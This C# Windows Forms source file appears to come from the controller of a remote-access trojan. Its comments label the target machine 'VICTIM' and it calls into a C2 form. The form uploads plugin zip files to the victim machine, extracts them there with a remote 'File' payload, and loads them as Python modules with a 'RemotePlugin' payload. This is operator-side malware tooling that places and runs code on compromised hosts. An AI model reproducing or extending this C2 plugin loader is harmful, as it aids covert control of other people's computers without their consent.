using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmRPluginUpload : Form
    {
        public Victim v; //VICTIM
        public Dictionary<string, Dictionary<string, string>> dic_plugins;
        public string tmp_folder; //REMOTE TEMP FOLDER PATH

        int item_ok = 0;
        public int plugin_loaded = 0;

        public frmRPluginUpload()
        {
            InitializeComponent();
        }

        public void rPluginLoaded(string name)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = listView1.FindItemWithText(name);
                item.ImageIndex = 0;
                item.SubItems[2].Text = "Loaded";

                progressBar1.Increment(1);
                WriteLogs($"Loaded library : {name}");

                //FINISHED
                if (progressBar1.Value == progressBar1.Maximum)
                {
                    WriteLogs("All library are loaded");
                    DialogResult r = MessageBox.Show("All libraray are loaded, close and refresh?", "Plugin Loader", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    if (r == DialogResult.Yes)
                    {
                        C2.form1.rPlugin_Refresh();
                        Close();
                    }
                }
            }));
        }

        public void rPluginLoader()
        {
            Invoke(new Action(() =>
            {
                progressBar1.Value = 0;
                WriteLogs("Extract completed, load plugin");
                foreach (ListViewItem item in listView1.Items)
                {
                    string name = Path.GetFileNameWithoutExtension(item.Text);
                    string version = "X";
                    string import_payload = $"import {name}";

                    if (name.Contains("-"))
                        version = name.Split('-')[1];

                    v.RunPayload("RemotePlugin", v, new string[]
                    {
                        "l", //LOAD
                        name, //NAME
                        version, //VERSION
                        tmp_folder, //MODULE EXTRACTED LOCATION
                        import_payload, //"IMPORT" PYTHON CODE
                    });
                }
            }));
        }

        private void ExtractZipFiles()
        {
            Invoke(new Action(() =>
            {
                string[] files = listView1.Items.Cast<ListViewItem>().ToArray().Select(x => x.SubItems[3].Text).ToArray();
                v.RunPayload("File", v, new string[]
                {
                    "af_e", //ARCHIVE FILE - EXTRACT
                    "1", //OP CODE : REMOTE PLUGIN
                    string.Join(",", files), //ALL UPLOADED PLUGIN FILES
                    tmp_folder, //TEMP FOLDER
                });
            }));
        }

        private void WriteLogs(string msg)
        {
            richTextBox1.AppendText("[*] " + msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        public void UpdateStatus(string remote_file)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = listView1.FindItemWithText(remote_file);
                if (item == null)
                {
                    MessageBox.Show("Items length is 0", "frmRPluginUpload - UpdateStatus", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                item.SubItems[2].Text = "OK";
                item_ok++;
                toolStripStatusLabel1.Text = $"{item_ok}/{dic_plugins.Count}";
                progressBar1.Increment(1);
                if (item_ok == dic_plugins.Count)
                {
                    WriteLogs("Upload completed, extracting...");
                    ExtractZipFiles(); //EXTRACT ZIP FILES
                }
            }));
        }

        private void setup()
        {
            foreach (string name in dic_plugins.Keys)
            {
                try
                {
                    Dictionary<string, string> value = dic_plugins[name];
                    ListViewItem item = new ListViewItem(name);
                    item.SubItems.Add(value["tmpfolder"]); //TEMP FOLDER
                    item.SubItems.Add("N"); //OK?
                    item.SubItems.Add(value["path"]); //ZIP REMOTE PATH
                    item.ImageIndex = 1;
                    listView1.Items.Add(item);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "rPluginUpload - setup", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            progressBar1.Maximum = dic_plugins.Count;
            progressBar1.Value = 0;
            toolStripStatusLabel1.Text = $"{item_ok}/{dic_plugins.Count}";

            WriteLogs("Uploading...");
        }

        private void frmRPluginUpload_Load(object sender, EventArgs e)
        {
            setup();
        }
    }
}
